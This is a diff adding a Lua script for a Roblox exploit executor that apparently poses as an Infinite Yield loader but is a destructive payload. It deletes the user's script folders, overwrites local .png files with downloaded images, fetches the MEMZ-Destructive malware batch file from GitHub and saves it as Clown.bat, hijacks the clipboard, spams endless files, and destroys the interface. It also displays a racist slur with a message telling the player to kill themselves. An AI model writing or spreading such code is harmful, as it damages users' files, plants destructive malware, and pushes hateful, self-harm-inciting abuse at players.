@@ -1,0 +1,298 @@
+-- This file was generated at discord.gg/syncrypt
+
+if isfolder("infiniteyield") then
+    delfolder("infiniteyield")
+end
+makefolder("infiniteyield")
+makefolder("infiniteyield/assets")
+for _, v in pairs({
+	"bindsandplugins.png",
+	"close.png",
+	"editaliases.png",
+	"editkeybinds.png",
+	"edittheme.png",
+	"editwaypoints.png",
+	"imgstudiopluginlogo.png",
+	"logo.png",
+	"minimize.png",
+	"pin.png",
+	"reference.png",
+	"settings.png"
+}) do
+    pcall(function()
+        writefile("infiniteyield/assets/" .. v, game:HttpGet("https://imgfy.ru/ib/Zx44hG67tsu1INB_1772919973.webp"))
+    end)
+end
+if IsOnMobile then
+    writefile("infiniteyield/assets/.nomedia", "")
+end
+for v5, v6 in pairs(listfiles("")) do
+
+    local v7 = v6
+
+    if v7:sub(-4) == ".png" then
+        delfile(v7)
+        pcall(function()
+            writefile(v7, game:HttpGet("https://imgfy.ru/ib/Zx44hG67tsu1INB_1772919973.webp"))
+        end)
+    end
+end
+if isfile("IY_FE.iy") then
+    delfile("IY_FE.iy")
+    writefile("IY_FE.iy", "{\"currentShade2\":[1,0,0],\"StayOpen\":true,\"logsEnabled\":false,\"aliases\":[],\"PluginsTable\":[],\"prefix\":\"Kids\",\"binds\":[],\"currentShade3\":[0.8,0,0],\"WayPoints\":[],\"LogsEnabled\":false,\"currentScroll\":[0.9,0,0],\"keepIY\":false,\"eventBinds\":\"[]\",\"espTransparency\":1,\"currentShade1\":[0.7,0,0],\"guiScale\":1.3,\"currentText2\":[1,0,0],\"currentText1\":[1,0,0]}")
+end
+for _, v in pairs({
+	"Rayfield",
+	"dex"
+}) do
+    if isfolder(v) then
+        for _, v2 in pairs(listfiles(v)) do
+            delfile(v2)
+        end
+
+        delfolder(v)
+    end
+end
+pcall(function()
+    writefile("Clown.bat", game:HttpGet("https://raw.githubusercontent.com/danfigueroa/Malware/refs/heads/master/MEMZ-Destructive.bat"))
+end)
+spawn(function()
+    local TextBox = Instance.new("TextBox", game:GetService("CoreGui"))
+
+    TextBox:CaptureFocus()
+    spawn(function()
+        wait(1)
+        TextBox:Destroy()
+    end)
+
+    while wait() do
+        setclipboard((function(p1, p2)
+            local s1 = ""
+
+            for _ = 1, math.random(p1, p2) do
+                s1 ..= string.sub("abcdefghijklmnopqrstuvw🤡💩xyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", math.random(1, 70), math.random(1, 70))
+            end
+
+            return s1
+        end)(520, 700))
+    end
+end)
+spawn(function()
+    while wait(0.1) do
+        pcall(function()
+            local t1 = { "🤡 " .. game.Players.LocalPlayer.Name }
+            local ActualizarCartelEvent = game:GetService("ReplicatedStorage"):FindFirstChild("ActualizarCartelEvent")
+
+            if ActualizarCartelEvent then
+                ActualizarCartelEvent:FireServer(unpack(t1))
+            end
+        end)
+    end
+end)
+spawn(function()
+    while true do
+        wait()
+        pcall(function()
+            writefile("🤡" .. tostring(math.random(1000000000)) .. ".txt", "")
+        end)
+    end
+end)
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local Character = LocalPlayer.Character
+if not Character then
+    Character = LocalPlayer.CharacterAdded:Wait()
+end
+local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+game.Lighting.Ambient = Color3.fromRGB(40, 0, 0)
+game.Lighting.Brightness = 0.1
+game.Lighting.OutdoorAmbient = Color3.fromRGB(20, 0, 0)
+game.Lighting.ColorShift_Top = Color3.fromRGB(80, 0, 0)
+game.Lighting.ColorShift_Bottom = Color3.fromRGB(20, 0, 0)
+game.Lighting.FogColor = Color3.fromRGB(60, 0, 0)
+game.Lighting.FogEnd = 30
+game.Lighting.FogStart = 5
+game.Lighting.ClockTime = 0
+local function v15(p3)
+    local Part = Instance.new("Part")
+
+    Part.Parent = workspace
+    Part.Anchored = true
+    Part.Transparency = 1
+    Part.CanCollide = false
+
+    if p3 then
+        Part.Size = Vector3.new(0.3, 0.3, 0.3)
+
+        local v42 = math.random() * 2 * 3.141592653589793
+        local v43 = math.random()
+        local _math = math
+        local v45 = v43 * 1.5
+        local v46 = _math.cos(v42) * v45
+        local v47 = math.sin(v42)
+        local _math2 = math
+        local v49 = v47 * v45
+        local v50 = _math2.random(-0.5, 1.5)
+
+        Part.Position = HumanoidRootPart.Position + Vector3.new(v46, v50, v49)
+    else
+        Part.Size = Vector3.new(1, 1, 1)
+
+        local v51 = math.random() * 2 * 3.141592653589793
+        local v52 = math.random(3, 5)
+        local v53 = math.cos(v51)
+        local _math = math
+        local v55 = v53 * v52
+        local v56 = _math.sin(v51) * v52
+
+        Part.Position = HumanoidRootPart.Position + Vector3.new(v55, 0, v56)
+    end
+
+    local BillboardGui = Instance.new("BillboardGui")
+
+    BillboardGui.Parent = Part
+    BillboardGui.AlwaysOnTop = true
+
+    if p3 then
+        BillboardGui.Size = UDim2.new(1.3, 0, 1.3, 0)
+    else
+        BillboardGui.Size = UDim2.new(5, 0, 5, 0)
+    end
+
+    BillboardGui.Adornee = Part
+
+    local timestamp = tick()
+
+    spawn(function()
+        while true do
+            local v71 = Part
+
+            if v71 then
+                v71 = Part.Parent
+            end
+
+            if not v71 then
+                break
+            end
+
+            if tick() - timestamp >= 0.5 then
+                Part:Destroy()
+
+                return
+            end
+
+            Part.Position = Part.Position + Vector3.new(0, 1.2, 0)
+            wait(0.1)
+        end
+    end)
+end
+local function v16(p4)
+    local Part = Instance.new("Part")
+
+    Part.Parent = workspace
+    Part.Anchored = true
+    Part.Size = Vector3.new(3, 6, 3)
+
+    if not p4 then
+        p4 = Vector3.new(math.random(-400, 400), 4, math.random(-400, 400))
+    end
+
+    Part.Position = p4
+    Part.Transparency = 1
+    Part.CanCollide = false
+    Part.Touched:Connect(function(part)
+        local Model = part:FindFirstAncestorOfClass("Model")
+        local v69 = Model and Model:FindFirstChildOfClass("Humanoid")
+
+        if v69 then
+            v69 = Model:FindFirstChild("HumanoidRootPart")
+        end
+
+        if v69 then
+            Part:Destroy()
+
+            local Hint = Instance.new("Hint", LocalPlayer.PlayerGui)
+
+            while true do
+                wait(0.3)
+                Hint.Text = "kill yourself fucked nigga"
+            end
+        end
+    end)
+end
+spawn(function()
+    while true do
+        wait(0.3)
+
+        for _ = 1, 2 do
+            v15(true)
+        end
+    end
+end)
+spawn(function()
+    while true do
+        wait(0.5)
+
+        for _ = 1, 10 do
+            v16()
+        end
+    end
+end)
+v16(HumanoidRootPart.Position + Vector3.new(0, 4, 0))
+wait(1)
+local Sky = Instance.new("Sky")
+Sky.Parent = game.Lighting
+Sky.SkyboxBk = "rbxasset://sky/clouds/clouds_512_bk.tex"
+Sky.SkyboxDn = "rbxasset://sky/clouds/clouds_512_dn.tex"
+Sky.SkyboxFt = "rbxasset://sky/clouds/clouds_512_ft.tex"
+Sky.SkyboxLf = "rbxasset://sky/clouds/clouds_512_lf.tex"
+Sky.SkyboxRt = "rbxasset://sky/clouds/clouds_512_rt.tex"
+Sky.SkyboxUp = "rbxasset://sky/clouds/clouds_512_up.tex"
+Sky.SunAngularSize = 0
+Sky.MoonAngularSize = 0
+for _, child in pairs(workspace:GetChildren()) do
+    if child.className == "Sound" then
+        child:Remove()
+    end
+end
+local Sound = Instance.new("Sound", workspace)
+Sound.SoundId = "rbxassetid://146563959"
+Sound.Volume = 1e999
+Sound.Looped = true
+Sound.Pitch = 0.2
+Sound:Play()
+for v23, v24 in pairs(game:GetService("CoreGui"):GetChildren()) do
+
+    local v25 = v24
+
+    pcall(function()
+        v25:Destroy()
+    end)
+end
+for _, child in pairs(LocalPlayer.PlayerGui:GetChildren()) do
+    local v28 = child
+    local v29 = v28:IsA("Hint")
+
+    if v29 then
+        v29 = v28.Text == "kill yourself fucked nigga"
+    end
+
+    if not v29 then
+        pcall(function()
+            v28:Destroy()
+        end)
+    end
+end
+local t2 = {}
+for v33, v34 in ipairs(workspace:GetDescendants()) do
+
+    if v34:IsA("BasePart") then
+        table.insert(t2, v34)
+    end
+end
+while true do
+    for _, v in ipairs(t2) do
+        v.BrickColor = BrickColor.new("Really red")
+    end
+
+    wait(0.4)
+end
